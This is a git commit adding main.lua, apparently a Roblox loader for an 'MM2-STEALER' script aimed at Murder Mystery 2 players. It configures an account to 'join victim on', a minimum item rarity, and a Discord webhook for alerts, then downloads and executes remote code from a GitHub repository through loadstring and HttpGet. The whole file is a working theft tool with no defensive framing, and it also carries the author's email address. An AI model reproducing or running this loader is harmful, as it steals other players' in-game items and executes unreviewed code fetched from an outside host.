b751a77d6d79bd6871129c47d61812ad4aaac338
henryscripter3 <henrysixseige@gmail.com>
2025-04-10 21:04:26 +0100

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,7 @@
+_G.Username = "faze9962" -- user you should join victim on
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/henryscripter3/MM2-STEALER/refs/heads/main/test.lua",true))()
